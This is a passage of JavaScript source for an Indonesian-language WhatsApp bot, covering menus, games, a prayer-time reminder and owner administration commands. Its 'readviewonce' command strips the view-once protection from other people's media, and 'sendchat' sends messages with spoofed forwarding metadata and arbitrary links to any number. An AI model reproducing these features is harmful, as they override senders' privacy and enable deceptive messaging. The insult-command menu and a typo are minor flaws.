    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        sock.autoshalat[id] = [
            await sock.sendMessage(m.chat, {
          audio: {
            url: "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ"
          },
          mimetype: 'audio/mpeg',
           contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `Sudah Waktunya Sholat ${sholat}`, 
thumbnailUrl: "https://raw.githubusercontent.com/zionjs/game/refs/heads/main/6f20a7d3621d7f2b0077a6a421f31230.jpg", 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}}, {}),
            setTimeout(async () => {
delete sock.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
    function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
    // GAME TEBAK KATA
if (global.tebakkata) {
let { soal, jawaban, waktu } = tebakkata
if (body.toLowerCase().includes(jawaban)) {
await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}`);
clearTimeout(waktu);
delete tebakkata
}
}
// GAME ASAH OTAK
if (global.asahotak) {
let { soal, jawaban, waktu } = asahotak
if (body.toLowerCase().includes(jawaban)) {
await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}`);
clearTimeout(waktu);
delete asahotak
}
}
// Game Susun Kata
if (global.susunkata) {
let { soal, jawaban, waktu } = susunkata
if (body.toLowerCase().includes(jawaban)) {
await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}`);
clearTimeout(waktu);
delete susunkata
}
}
// Game Tebak Gambar
if (global.tebakgambar) {
let { soal, jawaban, waktu } = tebakgambar
if (body.toLowerCase().includes(jawaban)) {
await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}`);
clearTimeout(waktu);
delete tebakgambar
}
}
// Game Tebak Bendera
if (global.tebakbendera) {
let { soal, jawaban, waktu } = tebakbendera
if (body.toLowerCase().includes(jawaban)) {
await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}`);
clearTimeout(waktu);
delete tebakbendera
}
}
// Game Tebak Kimia
if (global.tebakkimia) {
let { soal, jawaban, waktu } = tebakkimia
if (body.toLowerCase().includes(jawaban)) {
await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}`);
clearTimeout(waktu);
delete tebakkimia
}
}
// Game Family 100
if (global.family) {
let { soal, jawaban, waktu } = family
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}`)
}
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family
}
}

		/*
		Theme
		*/
const tema1 = "╔╍╍╍"
const tema2 = "╎⧽ "
const tema3 = "╚╍╍╍╍╍╍╍╍╍╍╍╍╍╍╯"

// OWNER
const own = `
${tema1} *MENU - OWNER*
${tema2}.joingc
${tema2}.addowner
${tema2}.delowner
${tema2}.listowner
${tema2}.addprem
${tema2}.delprem
${tema2}.listprem
${tema2}.setbotpp
${tema2}.setbotname
${tema2}.setbotbio
${tema2}.autoread
${tema2}.autotyping
${tema2}.autobio
${tema2}.onlygc
${tema2}.onlypc
${tema2}.onlyadmin
${tema2}.addcase
${tema2}.delcase
${tema2}.listcase
${tema2}.getcase
${tema2}.self/public
${tema2}.creategc
${tema2}.backupsc
${tema2}.sendchat
${tema3}
`
const group = `
${tema1} *MENU - GROUP*
${tema2}.open/close
${tema2}.promote/demote
${tema2}.antilinkall
${tema2}.antilinkgc
${tema2}.antilinkch
${tema2}.antilinkig
${tema2}.antiwame
${tema2}.antijudol
${tema2}.kick
${tema2}.linkgc
${tema2}.resetlinkgc
${tema2}.totag
${tema2}.hidetag
${tema2}.tagall
${tema2}.setppgc
${tema2}.delppgc
${tema3}`

const other = `
${tema1} *MENU - OTHER*
${tema2}.bfstock
${tema2}.sound1 - sound250
${tema2}.sad1 - sad55
${tema2}.removebg
${tema2}.pastebin
${tema2}.getpp
${tema2}.iqc
${tema2}.brat
${tema2}.bratvid
${tema2}.remini
${tema2}.smeme
${tema2}.toimage
${tema2}.tovn
${tema2}.toaudio
${tema2}.tourl
${tema2}.tourl2
${tema2}.stiker
${tema2}.cek
${tema2}.ping
${tema2}.owner
${tema2}.afk
${tema2}.getpb
${tema2}.owner
${tema3}
`
const aiv = `
${tema1} *MENU - AI*
${tema2}.putihkan
${tema2}.hitamkan
${tema2}.edit
${tema2}.lyrra
${tema2}.lyrraai
${tema2}.autoai
${tema2}.ai
${tema2}.gpt
${tema2}.openai
${tema2}.togigura
${tema2}.tovigurav2
${tema2}.tofigurav3
${tema3}
`

const download = `
${tema1} *MENU - DOWNLOAD*
${tema2}.SnackVideo
${tema2}.tiktok
${tema2}.facebook
${tema2}.Instagram
${tema2}.ytmp4
${tema2}.ytmp3
${tema2}.tiktoksearch
${tema2}.ytsearch
${tema2}.pin
${tema2}.capcut
${tema2}.tiktokaudio
${tema3}
`

const convert = `
${tema1} *MENU - CONVERT*
${tema2}.bass
${tema2}.blown
${tema2}.deep
${tema2}.earrrape
${tema2}.fast
${tema2}.fat
${tema2}.nightcore
${tema2}.reverse
${tema2}.robot
${tema2}.slow
${tema2}.smooth
${tema2}.tupai
${tema3}
`
const cpanel = `
${tema1} *MENU - CPANEL*
${tema2}.1gb
${tema2}.2gb
${tema2}.3gb
${tema2}.4gb
${tema2}.5gb
${tema2}.6gb
${tema2}.7gb
${tema2}.8gb
${tema2}.9gb
${tema2}.10gb
${tema2}.unli
${tema2}.cadmin
${tema2}.deladmin
${tema2}.listadmin
${tema2}.delpanel
${tema2}.listpanel
${tema3}`

const cpanel2 = `
${tema1} *MENU - CPANELV2*
${tema2}.1gb-V2
${tema2}.2gb-V2
${tema2}.3gb-V2
${tema2}.4gb-V2
${tema2}.5gb-V2
${tema2}.6gb-V2
${tema2}.7gb-V2
${tema2}.8gb-V2
${tema2}.9gb-V2
${tema2}.10gb-V2
${tema2}.unli-V2
${tema2}.cadmin-V2
${tema2}.deladmin-V2
${tema2}.listadmin-V2
${tema2}.delpanel-V2
${tema2}.listpanel-V2
${tema3}
`

const fun = `
${tema1} *MENU - FUN*
${tema2}.goblok
${tema2}.janda
${tema2}.perawan
${tema2}.babi
${tema2}.tolol
${tema2}.pekok
${tema2}.jancok
${tema2}.pinter
${tema2}.asu
${tema2}.bodoh
${tema2}.lesbi
${tema2}.bajingan
${tema2}.anjing
${tema2}.anjg
${tema2}.anjj
${tema2}.anj
${tema2}.ngentod
${tema2}.ngentot
${tema2}.monyet
${tema2}.mastah
${tema2}.newbie
${tema2}.bangsat
${tema2}.ʙangke
${tema2}.sange
${tema2}.sangean
${tema2}.dakjal
${tema2}.horny
${tema2}.wibu
${tema2}.puki
${tema2}.puqi
${tema2}.peak
${tema2}.pantex
${tema2}.pantek
${tema2}.setan
${tema2}.iblis
${tema2}.cacat
${tema2}.yatim
${tema2}.piatu
${tema3}
`

const anime = `
${tema1} *MENU - ANIME*
${tema2}.akiyama
${tema2}.ana
${tema2}.art
${tema2}.asuna
${tema2}.ayuzawa
${tema2}.boruto
${tema2}.bts
${tema2}.cartoon
${tema2}.chiho
${tema2}.chitoge
${tema2}.cosplay
${tema2}.cosplayloli
${tema2}.cosplaysagiri
${tema2}.cyber
${tema2}.deidara
${tema2}.doraemon
${tema2}.elaina
${tema2}.emilia
${tema2}.erza
${tema2}.exo
${tema2}.gamewallpaper
${tema2}.gremory
${tema2}.hacker
${tema2}.hestia
${tema2}.hinata
${tema2}.husbu
${tema2}.inori
${tema2}.islamic
${tema2}.isuzu
${tema2}.itachi
${tema2}.itori
${tema2}.jennie
${tema2}.jiso
${tema2}.justina
${tema2}.kaga
${tema2}.kagura
${tema2}.kakasih
${tema2}.kaori
${tema2}.keneki
${tema2}.kotori
${tema2}.kurumi
${tema2}.lisa
${tema2}.madara
${tema2}.megumin
${tema2}.mikasa
${tema2}.mikey
${tema2}.miku
${tema2}.minato
${tema2}.mountain
${tema2}.naruto
${tema2}.neko2
${tema2}.nekonime
${tema2}.nezuko
${tema2}.onepiece
${tema2}.pentol
${tema2}.pokemon
${tema2}.programming
${tema2}.randomnime
${tema2}.randomnime2
${tema2}.rize
${tema2}.rose
${tema2}.sagiri
${tema2}.sakura
${tema2}.sasuke
${tema2}.satanic
${tema2}.shina
${tema2}.shinka
${tema2}.shinomiya
${tema2}.shizuka
${tema2}.shota
${tema2}.shortquote
${tema2}.space
${tema2}.technology
${tema2}.tejina
${tema2}.toukachan
${tema2}.tsunade
${tema2}.yotsuba
${tema2}.yuki
${tema2}.yulibocil
${tema2}.yumeko
${tema3}
`

const games = `
${tema1} *MENU - GAME*
${tema2}.tebakkta
${tema2}.tebakgambar
${tema2}.tebakbendera
${tema2}.tebakkimia
${tema2}.asahotak
${tema2}.susunkata
${tema2}.family100
${tema3}`

const primbown = `
${tema1} *MENU - PRIMBON*
${tema2}.artinama
${tema2}.artimimpi
${tema2}.ramaljodoh
${tema2}.ramaljodohbali
${tema2}.ramalcinta
${tema2}.cocoknama
${tema2}.pasangan
${tema2}.suamiistri
${tema2}.jadiannikah
${tema2}.sifatusaha
${tema2}.rezeki
${tema2}.pekerjaan
${tema2}.nasib
${tema2}.penyakit
${tema2}.tarot
${tema2}.fengshui
${tema2}.haribaik
${tema2}.harisangar
${tema2}.harisial
${tema2}.nagahari
${tema2}.arahrezeki
${tema2}.peruntungan
${tema2}.weton
${tema2}.karakter
${tema2}.keberuntungan
${tema2}.memancing
${tema2}.masabubur
${tema2}.zodiak
${tema2}.shio
${tema3}
`

const maker = `
${tema1} *MENU - MAKER*
${tema2}.txt2img
${tema2}.txt2imgv2
${tema2}.txt2imgv3
${tema2}.txt2imgv4
${tema2}.txt2imgv5
${tema2}.txt2imgv6
${tema2}.bratgenerator
${tema2}.pak-ustad
${tema2}.ngl
${tema3}
`
// LIST
const listm = `
${tema1} *LIST - MENU*
${tema2}.allmenu
${tema2}.menuowner
${tema2}.menuother
${tema2}.menuai
${tema2}.menudownload
${tema2}.menuconvert
${tema2}.menucpanel
${tema2}.menucpanel2
${tema2}.menufun
${tema2}.menuanime
${tema2}.menuprimbon
${tema2}.menumaker
${tema3}
`
const all = `
${own}
${group}
${other}
${aiv}
${download}
${convert}
${cpanel}
${cpanel2}
${fun}
${anime}
${games}
${primbown}
${maker}
`
//============= [ COMMANDS ] ====================================================
        switch (command) {
        case 'speed': case 'ping': {
				try {
					const used = process.memoryUsage();
					const cpus = os.cpus().map(cpu => {
						cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
						return cpu;
					});
					const cpu = cpus.reduce((last, cpu, _, { length }) => {
						last.total += cpu.total;
						last.speed += cpu.speed / length;
						last.times.user += cpu.times.user;
						last.times.nice += cpu.times.nice;
						last.times.sys += cpu.times.sys;
						last.times.idle += cpu.times.idle;
						last.times.irq += cpu.times.irq;
						return last;
					}, {
						speed: 0,
						total: 0,
						times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
					});
					let start = performance.now();
					let end = performance.now();
					let latensi = end - start;
					let osInfo = await nou.os.oos();
					let storage = await nou.drive.info();
					let respon = `✨ *Informasi Bot WhatsApp* ✨\n\n📡 *Jaringan Server*\n · *Ping:* ${latensi.toFixed(4)} Detik\n\n🖥️ *Informasi Server*\n · *OS:* ${osInfo}\n · *IP Address:* ${nou.os.ip()}\n · *Tipe OS:* ${nou.os.type()}\n\n💾 *RAM:*\n · *Total:* ${formatp(os.totalmem())}\n · *Digunakan:* ${formatp(os.totalmem() - os.freemem())}\n\n📂 *Penyimpanan:*\n · *Total:* ${storage.totalGb} GB\n · *Digunakan:* ${storage.usedGb} GB (${storage.usedPercentage}%)\n · *Tersedia:* ${storage.freeGb} GB (${storage.freePercentage}%)\n\n⏳ *Waktu Aktif Server:*\n${runtime(process.uptime())}\n\n⚙️ *CPU (${cpus.length} Core)*\n · *Model:* ${cpus[0].model.trim()}\n · *Kecepatan:* ${cpu.speed} MHz\n${Object.keys(cpu.times).map(type => ` · *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n`;
					await sock.sendMessage(m.chat, {
						text: respon,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 999999, 
							isForwarded: false, 
							forwardedNewsletterMessageInfo: {
								newsletterName: name,
								newsletterJid: null,
							},
							externalAdReply: {
								title: "© "+namaBot,
								thumbnailUrl: thumbnail2,
								sourceUrl: null,
								mediaType: 1,
								renderLargerThumbnail: false
							}
						}
					}, { quoted: m });
				} catch (err) {
					console.error(err);
				}
			}
			break;
			case "ttf":
			case "totalfitur": {
			reply("TOTAL FITUR : "+totalfitur)
			}
			break
			case "developerbot": case "owner": case "own": case "dev": {
await sock.sendContact(m.chat, [global.owner], null)
sock.sendMessage(m.chat, {text:`Hai @${m.sender.split("@")[0]} ini adalah owner aku`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break
// MENU
case "menu": {
React()
menu(listm)
}
break
case "allmenu": {
React()
menu(all)
}
break
case "menuowner": {
React()
menu(own)
}
break
case "menugroup": {
React()
menu(group)
}
break
case "menuother": {
React()
menu(other)
}
break
case "menuai": {
React()
menu(aiv)
}
break
case "menudownload": {
React()
menu(download)
}
break
case "menuconvert": {
React()
menu(convert)
}
break
case "menucpanel": {
React()
menu(cpanel)
}
break
case "menucpanel2": {
React()
menu(cpanel2)
}
break
case "menufun": {
React()
menu(fun)
}
break
case "menuanime": {
React()
menu(anime)
}
break
case "menugame": {
React()
menu(games)
}
break
case "menuprimbon": {
React()
menu(primbown)
}
break
case "menumaker": {
React()
menu(maker)
}
break

/*
         OWNER
*/
case 'sendchat': {
if (!isOwner) return reply(mess.owner)
  if (!text) return m.reply(`Contoh: ${cmd} Hai | id |https://`)
  let [l, r, p] = text.split`|`
if (!l) l = ''
if (!r) r = ''
if (!p) p = ''
  let teks = `${l}`

  // ID Owner Bot (bisa lebih dari satu)
  const ownerJid = [`${r}`] // ganti dengan nomor owner

  for (let id of ownerJid) {
    await sock.sendMessage(id, {
    interactiveMessage: {
      title: teks,
      footer: namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: namaBot,
            button_title: namaBot
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "source",
          url: p,
          merchant_url: p
})
          }
        ]
      }
    }
  },
  { quoted: m });
  }


  m.reply('Berhasil mengirim pesan')
}
break
case 'join':
    case 'joingc': {
      if (!isOwner) return reply(mess.owner);
      if (!text) return m.reply(`Contoh: ${cmd} linkgc`)
      sock.sendMessage(m.chat, {
        text: 'Sukses join ke grup.'
      }, {
        quoted: m
      })
      let result = args[0].split('https://chat.whatsapp.com/')[1]
      await sock.groupAcceptInvite(result)
    }
    break
    case "addowner": case "addown": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owner.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owner.push(input)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}

break
case "listowner": case "listown": {
if (owner.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owner) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: m})
}
break
case "delowner": case "delown": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owner.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owner.indexOf(input)
await owner.splice(posi, 1)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break
case 'delppbot': {
if (!isOwner) return reply(mess.owner)
await sock.removeProfilePicture(sock.user.id)
reply(`Berhasil Menghapus Gambar Profil Bot`)
}
break
case 'setbotpp':
    case 'setppbot': {
      if (!isOwner) return relply(mess.owner)
      if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      if (/webp/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      let media = await sock.downloadAndSaveMediaMessage(quoted)
      await sock.updateProfilePicture(botNumber, {
        url: media
      }).then(() => fs.unlinkSync(media)).catch((err) => fs.unlinkSync(media))
      m.reply('Sukses mengganti pp bot!')
    }
    break
case "tojs": case "q": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break 
case "rvo": case "readviewonce": {
 if (!isOwner) return reply(mess.owner);
if (!m.quoted) return reply("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return sock.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
case "listprem": {
if (!isOwner) return reply(mess.owner)
if (premium.length < 1) return reply("𝘕𝘰 𝘏𝘢𝘷𝘦 𝘜𝘴𝘦𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 :(")
let teks = `\n𝘓𝘪𝘴𝘵 𝘈𝘭𝘭 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break
case "addprem": {
if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘗𝘳𝘦𝘮𝘪𝘶𝘮!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
}
break
case "delprem": {
    if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break
case "self": case "public": {
   if (!isOwner) return m.reply(mess.owner)
   let status = true
   if (command == "self") status = false
   sock.public = status
   fs.writeFileSync("./setdb.json", JSON.stringify({ public: status }, null, 2))
   return m.reply(`Berhasil mengganti ke mode *${command}*`)
}
break
case "rst": case "restart": {
if (!isOwner) return m.reply(mess.owner)
function restartServer() {
const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });
  process.exit(0);
}
await m.reply("*Restarting*")
await setTimeout(() => {
restartServer();
}, 4500)
}
break
case "mode": {
   m.reply(`🤖 Bot Mode: ${sock.public ? "Public" : "Self"}`)
}
break
case "setnamabot":
            case "setbotname":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Dimana namanya?\nContoh: ${cmd} Lyrra`);
 }
 await sock.updateProfileName(text);
 reply(`Success in changing the name of bot's number`);
 }
 break;
 case "setbiobot":
 case "setbotbio":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Dimana teksnya?\nContoh: ${cmd} Lyrra`);
 }
 await sock.updateProfileStatus(text);
 reply(`Success in changing the bio of bot's number`);
 }
 break;

case "creategc":
 case "creategroup":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!args.join(" ")) {
 return reply(`Use ${cmd} groupname`);
 }
 try {
 let cret = await sock.groupCreate(args.join(" "), []);
 let response = await sock.groupInviteCode(cret.id);
 teks = ` 「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
 `;
 sock.sendMessage(m.chat, {
 text: teks,
 mentions: await sock.parseMention(teks)
 }, {
 quoted: m
 });
 } catch {
 reply("yah Error kak laporankan ke owner agar di perbaiki");
 }
 }
 break;
 case "getcase": { 
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("namaCase")
    try {
        let hasil = Case.get(text);
        reply(`✅ Case ditemukan:\n\n${hasil}`);
    } catch (e) {
        reply(e.message);
    }
}
break;

case "addcase": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(`case "namacase": { ... }`)
    try {
        Case.add(text);
        reply("✅ Case berhasil ditambahkan.");
    } catch (e) {
        reply(e.message);
    }
}
break;

case "delcase": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("namaCase")
    try {
        Case.delete(text);
        reply(`✅ Case "${text}" berhasil dihapus.`);
    } catch (e) {
        reply(e.message);
    }
}
break;

case "listcase": {
    if (!isOwner) return reply(mess.owner);
    try {
        reply("📜 List Case:\n\n" + Case.list());
    } catch (e) {
        reply(e.message);
    }
}
break;
case 'onlyadmin': {
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlyadmin) return m.reply('Sudah diaktifkan sebelumnya')
        setting.onlyadmin = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlyadmin) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.onlyadmin = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break 
case 'onlypc': {
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlypm) return m.reply('Sudah diaktifkan sebelumnya')
        setting.onlypm = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlypm) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.onlypm = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }
break                                    
case 'onlygc': {
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlygc) return m.reply('Sudah diaktifkan sebelumnya')
        setting.onlygc = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlygc) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.onlygc = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }
break     
case 'autobio': {
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autobio) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autobio = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autobio) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autobio = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break               
case 'readchange': case 'autoread':{
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autoread) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autoread = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autoread) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autoread = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }
break
    case 'autotyping': {
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autotyping) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autotyping = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autotyping) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autotyping = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
